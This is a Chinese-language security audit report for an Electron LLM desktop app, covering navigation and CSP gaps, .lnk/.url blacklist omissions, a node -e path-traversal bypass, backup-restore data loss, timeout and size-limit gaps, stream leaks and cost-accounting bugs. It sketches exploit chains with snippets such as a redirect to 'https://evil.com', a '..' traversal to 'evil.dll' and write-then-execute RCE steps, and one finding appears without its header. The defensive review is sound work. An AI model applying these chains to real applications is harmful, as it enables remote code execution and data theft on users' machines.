## 一、E 系列：主进程 / IPC / 文件系统 / 安全（15 条）

### E-1【P1】主窗无 will-navigate 导航防护 + 全部渲染入口无 CSP——被 XSS 的渲染层可整窗导航至远程源，preload 全量暴露

- **证据**：`electron\window-manager.ts:29-83`——五个窗口均只配置了 `setWindowOpenHandler`（仅拦截 window.open/target=_blank）；全 electron\ 目录 grep 无 `will-navigate`；全部 `*.html` 入口无 `Content-Security-Policy`；`electron\preload.ts:3-295` 将 `shellExec`/`fileWrite`/`mcpSpawn`/`vaultWrite` 等全量 API 注入所有页面。
- **机制影响**：渲染进程被 XSS 后执行 `location.href = 'https://evil.com'`（或 meta refresh）不受任何拦截——preload 脚本随窗口注入到新加载的任意远程页面，攻击者页面直接获得完整 `window.electronAPI`。这使 pathValidator/shell-security 全部主进程防线失去设计前提（"渲染层不可信但隔离在本地页面"）。缺 CSP 意味着渲染层 XSS 无第二道缓解（当前仅靠 dompurify 单点防御 LLM 输出注入）。Electron 官方安全清单明确要求 will-navigate 白名单 + CSP，二者皆缺。
- **修复方向**：主进程为所有窗口挂 `will-navigate` 事件，白名单外（非 file:// 本地入口）`event.preventDefault()`；全部 HTML 入口补 CSP meta（default-src 'self'，按需放行 connect-src 的 LLM API 域）。

### E-2【P1】扩展名黑名单漏 `.lnk`/`.url`——file:write 落盘快捷方式 + shell:openPath 打开 = 渲染层 RCE 闭环（已人工抽验坐实）

- **证据**：`electron\pathValidator.ts:60-67`——DANGEROUS_EXTENSIONS 33 项无 `.lnk`/`.url`/`.application`/`.appref-ms`；`electron\ipc-handlers.ts:379-396`——file:write 走 validateWritePath，`.lnk` 放行且 `opts.encoding` 接受任意 BufferEncoding（latin1 可写二进制 lnk 内容）；`ipc-handlers.ts:1319-1331`——shell:openPath 对 `.lnk` 放行，`shell.openPath` → ShellExecute 解析快捷方式目标。Desktop 不在 FORBIDDEN_WRITE_PATHS。
- **机制影响**：P0-5/P0-6 修复建立了"DANGEROUS_EXTENSIONS 黑名单 + FORBIDDEN_WRITE_PATHS"双防线，但 ShellExecute 对 `.lnk` 的执行语义完全绕开路径层：快捷方式**内部**的目标路径与参数不经过任何校验。被攻陷渲染层两步即达任意命令执行：① `fileWrite('C:\Users\<u>\Desktop\x.lnk', <二进制lnk内容>, 'latin1')`；② `openFilePath('...\x.lnk')` → ShellExecute 启动 lnk 指向的任意程序（含参数如 `cmd /c ...`）。`.url`（纯文本 INI）同链可打开任意 URL。黑名单式防御对"ShellExecute 可执行的文件类型集合"覆盖不全。
- **修复方向**：openPath 改用 SAFE_OPEN_EXTENSIONS 白名单（该常量已存在但零消费者，即 A1-26 在册）；黑名单补 `.lnk`/`.url`/`.application`/`.appref-ms`。

### E-3【P1】node -e 写路径白名单可被 `..` 穿越绕过，且写入无扩展名校验——"写 .js 到 Desktop → mcp:spawn node 执行"完整 RCE 链（已人工抽验坐实）

- **证据**：`electron\shell-security.ts:128-131`——NODE_E_ALLOWED_WRITE_PATTERNS 正则 `(?:[^'"]*[/\\])?(Desktop|Documents|Downloads)[/\\]` 对路径不做规范化，`'C:\Users\x\Desktop\..\..\..\Windows\evil.dll'` 直接匹配；`:165-176`——isWriteFile 分支仅检查该正则，无 canonicalize、无 DANGEROUS_EXTENSIONS 检查；`:136-139`——require 白名单含 `fs`；`:235-255`——MCP `node` 分支允许执行 Desktop 下 `.js`；`test\ipcSecurity.spec.ts:143-156`——测试仅覆盖合法 Desktop 路径与 `/etc/evil` 字面量，无 `..` 用例。
- **机制影响**：这是对 P0-2 修复所新增防线**本身**的绕过：`writeFileSync` 命中黑名单后靠 ALLOWED_WRITE_PATTERNS 放行，而该正则可被 `Desktop\..\` 前缀穿越到任意目录；即便不穿越，`Desktop\x.js` 也被放行（node -e 写入不查扩展名）——file:write 虽禁 `.js`，这条旁路可产出 `.js`，再经 `mcpSpawn({command:'node', args:['C:\...\Desktop\x.js']})` 执行**零内容限制**的 JS，彻底闭合"落盘→执行"链。
- **修复方向**：优先整体禁用 node -e 或服务端固定模板（在册 P0-2 收尾建议，若采纳则本条自然消解）；若保留正则方案，须先 `path.resolve` 规范化后再匹配，并对产物扩展名过 DANGEROUS_EXTENSIONS。

### E-4【P1】backup:create 已纳入 vault/knowledge，但 backup:restore 仍只交换 store 目录——恢复"成功"却静默丢弃 SQLite 主数据轨道

- **证据**：`electron\ipc-handlers.ts:913-937`——create 打包 store + vaults + knowledge 三目录（P1-5 修复）；`:956-970`——restore 仅 `extractedStore` 存在性检查 + `validateExtractedBackup` + `renameSync` 交换 storeDir，vaults/knowledge 解压后随 `finally` 的 `rmSync(tmpDir)` 一并删除；970 行返回"备份已恢复…请重启应用生效"。
- **机制影响**：P1-5 修复只修了备份侧、漏了恢复侧，形成单向半链。按 2026-09-23 事故定案（`electron\apiConfigStore.ts:4-14`），vault 是唯一真相源（全部 Pinia store、api-config、密钥均持久化于 `vaults/default.db`），legacy store/*.json 只是兼容回退。用户执行"恢复"后：提示成功、实际主数据原样未动——灾难场景（磁盘损坏后迁移恢复）下用户以为数据回来了，实际丢的是最核心的部分。附带：备份时未做 `wal_checkpoint(TRUNCATE)`（对账报告 P1-5 修复方向明确要求），archiver 对 default.db 与 default.db-wal 的读取非原子，并发写入期间备份可能事务不一致。
- **修复方向**：restore 同步交换 vaults/knowledge 目录（重启前安全）；备份前执行 `PRAGMA wal_checkpoint(TRUNCATE)`。

### E-5【P2】http:fetch 超时只覆盖到响应头，body 读取阶段完全无超时——慢滴流可使 handler 无限挂起

- **证据**：`electron\ipc-handlers.ts:867-880`——每跳创建 controller + tierTimer/capTimer，`finally` 在 safeFetch **resolve 后立即** clearTimeout；`:228-264`——safeFetch 在收到响应头时即 resolve；`:902`——`await readBodyCapped(resp)` 时已无任何活跃 abort signal。
- **机制影响**：tierTimeout/HTTP_ABSOLUTE_CAP 实际只约束连接建立 + 首字节。恶意/异常服务器发完头后以 1 字节/分钟的速率滴流 body，单个 invoke 永久 pending（内存有 512KB 上限，但连接与 handler 对象常驻）；渲染层可无限制并发 httpFetch → 文件描述符与内存累积耗尽主进程。对比 LLM 路径（AbortSignal.timeout 全程挂在请求上，:1114）不受此影响。
- **修复方向**：把 abort signal 保持到 body 读完，或对 body 读取阶段单独计时超时。

### E-6【P2】llm:chatCompletion / llm:listModels 响应体 `resp.json()` 无大小上限——A-15 的 512KB 限量保护未覆盖 LLM 通道

- **证据**：`electron\ipc-handlers.ts:1120`——`await resp.json()` 整读解析；`:1221`——listModels 同；对照 `:70-90`——readBodyCapped 仅用于 http:fetch 与错误体（:1117/:1218）。
- **机制影响**：A-15 修复目标是"防止恶意/超大响应打爆主进程内存"，但 `provider.baseUrl` 由渲染层经 `vault:write('secure','holo-api-config')` 可控——被攻陷渲染层把 baseUrl 指向攻击者服务器，对 `/v1/chat/completions` 返回 10GB JSON，`resp.json()` 在主进程无界缓冲直至 OOM。LLM 请求体 `JSON.stringify(body)` 同样无入站大小校验，与 http:fetch 的 HTTP_MAX_BODY_SIZE=1MB 口径不一致。
- **修复方向**：LLM 通道复用 readBodyCapped 后再 parse；入站请求体统一大小校验。

### E-7【P2】llm:stream:start 全程无 sender 存活检查——窗口销毁后 send 抛异常路径导致 AbortController 泄漏且上游 HTTP 流不终止

- **证据**：`electron\ipc-handlers.ts:1546-1633`——SSE 循环内所有 `event.sender.send(chunkChannel…)` 无 `isDestroyed` 守卫，也无 webContents `destroyed` 事件监听去 abort；`:1627-1631`——catch 块中 `event.sender.send(errorChannel…)` 会再次抛 "Object has been destroyed"，其后 `activeStreamControllers.delete(streamId)` 不可达。
- **机制影响**：流式响应期间用户关闭主窗（或渲染进程崩溃）：第一个 chunk send 抛出 → 进入 catch → error send 再抛 → unhandledRejection 收场，activeStreamControllers 残留条目、abortCtrl 永不 abort，底层 fetch 连接持续消耗直到 tier 超时（最长 600s）自然到点。多次开关窗累积泄漏；llm:stream:cancel 也无法清理（渲染层已死）。该通道同时无并发数上限。
- **修复方向**：每 chunk send 前查 `event.sender.isDestroyed()`；监听 webContents `destroyed` 事件主动 abort + 清注册表。

- **证据**：`src\services\semanticCache.ts:170-172`——exactKey 构成只有 hash|domain|packId，无 taskType/callerId/model；查询侧 `src\stores\apiStore.ts:575-600`——cacheEligible 仅按"无 tools 且 ≤5 条消息"判定，classify 流量同样可命中/写入；classify 调用点真实存在且多为短消息（`src\services\errorClassifier.ts:96`、`src\services\promptTranslator.ts:147/186/264/384`、`src\services\l0SkillRouter.ts:88`、`src\services\dualEngineValidator.ts:276`）；entry 记录 tier 但 lookup 不比对（`semanticCache.ts:230-266`）。
- **机制影响**：① 一次 `maxTokens:16` 的语言判定调用产出"zh"之类短文本被缓存后，语义相似的聊天查询（exact 或 ≥0.92 相似）会把它当完整回答返回；反向地，主对话缓存的长文也可能喂给分类器。② 缓存条目不绑定实际 provider/model，切换/升级模型后 24h TTL 内继续返回旧模型答案——与"升级大模型"类操作直接冲突。
- **修复方向**：exactKey 与 lookup 加 taskType + model 维度；classify 类调用显式标记 callerId 并默认不读写主对话缓存。

### T-2【P2】detectUnsolvable 误报——主模型正常回答被冠以"当前只配置了小模型，任务未完成"横幅

- **证据**：`src\services\escalationPolicy.ts:21-30`——模式一 `/我[^。！？\n]{0,14}(做不到|无法|不能|没办法)/` 匹配正常表述；模式三匹配一切"作为文本AI助手"式自我描述；`src\stores\apiStore.ts:954-972 / :708-726 / :847-865`——三个出口对 role=main 的结果同样走 detectUnsolvable，escTarget=null 时前置 buildHonestNotice('small-only')；流式同构 `:1153-1159`；文案 `escalationPolicy.ts:61-65`——声称"当前只配置了小模型"而该回答恰恰来自主/大模型。
- **机制影响**："诚实陈述"机制在 false positive 方向撒谎：给一条完全成功的主模型回答加盖"本任务未完成"的元信息，且理由陈述与事实相反。对法律/财务场景（本产品目标域），"不能/无法"是高频正常措辞，触发面不小——信任损伤与实际功能损害兼有。
- **修复方向**：模式收窄（仅在升级路径实际触发后对 fallback 结果判定）或对"无法保证/无法确保"类句式设否定白名单；文案据实生成。

### T-3【P3】DEV 环境下 token 双重记账——_skipNextCapture 的顺序假设与实际执行序相反

- **证据**：`src\stores\debugStore.ts:166-179`——console 捕获通道 extractUsage 正则匹配 `usage: prompt=...` 行；`:127-136`——recordTokenUsage 设 `_skipNextCapture=true` 期望压住"下一条"捕获；实际执行序：非流式路径 `debugLog('[chatCompletion:ipc] usage: ...')`（`src\stores\apiStore.ts:679`，另 :887/:930 同型）**先于** emitRecordCost（:703/:907/:950）。生产无影响（`src\services\debugLog.ts:3-6` 仅 DEV 输出 console）。
- **机制影响**：DEV 调试面板 totalTokenUsage/estimatedCostCny 系统性虚高且错位，误导开发期成本观察；不影响 vault 记账链（recordLlmCost 单通道）。
- **修复方向**：skip 标志改为先置位后输出，或 console 捕获通道仅认未被 record-cost 覆盖的行。

### T-4【P3】实际计价全链统一为扁平 userPricing——分档价只存在于估算侧，预算预估与实际记账口径可系统性偏离

- **证据**：实际计价三处一致走 calculateCost（扁平 userPricing）：`src\stores\apiStore.ts:403-406`（actualCostOf）、`src\stores\debugStore.ts:133`、`src\services\tokenBudget.ts:241-243`（recordLlmCost）——G-5 修复后全链一致性本身成立；但 `src\services\tokenPricing.ts:6-11` 的 TIER_PRICING_MAP 分档价仅被 estimateStepCost（:61-67，预算预估）与 calculateCostByTier（:50-59，缓存节省统计）使用；默认 userPricing = 0.005/0.015（`src\models\index.ts:1212-1213`）恰为 standard 档价。
- **机制影响**：nano 档调用按 standard 价入账（高估 10 倍），pro 档按 standard 价入账（低估 3.5 倍）；预算 block 判定用的预估（分档价）与账本消耗（扁平价）口径不同，长期使用下"预算显示已超"与"账本说没超"（或反之）可同时成立。若 UserPricing 的设计意图就是"用户自填统一价"，则至少应在预算链统一口径并说明。
- **修复方向**：预算链与记账链统一口径（要么全分档、要么全扁平+文档承认）。

### T-5【P3·潜伏】kernel dispatch 的 LLM 路径若被启用，同一调用会在预算账本中双重记账且第二笔为估算值

- **证据**：`src\kernel\index.ts:188-195`——`cost = clusters.budget.estimateCost(effectiveTier, promptTokens)` 后 `clusters.budget.record(...)`；`src\kernel\clusters\budget.ts:17-25`——record → tokenBudget.recordLlmCost，与主链路同一账本；`kernel\index.ts:31-41` 同路径注册的 LLM port（`src\App.vue:576-586`）委托 apiStore.chatCompletion，后者自身经 debug:record-cost（`src\stores\apiStore.ts:1099-1114` 同构逻辑）→ recordLlmCost 已记一笔实际费用。
- **机制影响**：当前 kernelRegistry.dispatch 的 LLM 分支（`kernel\index.ts:149`，需 options.messages）未发现任何生产调用方——主对话直走 apiStore，dialogStore 仅用 kernelRegistry.route/hooks/否决门（`src\stores\dialogStore.ts:803/914/943`）。故记为潜伏问题：一旦 pack 或插件经 kernelRegistry.dispatch 发起带 messages 的调用，同一请求入账两次（一次实际 + 一次仅按输入 tokens 的估算），预算消耗翻倍失真。与 K-7 同属"kernel 死路径上的潜伏地雷"。
- **修复方向**：删除该记账分支或改口径（port 已记账则 dispatch 层不记）。
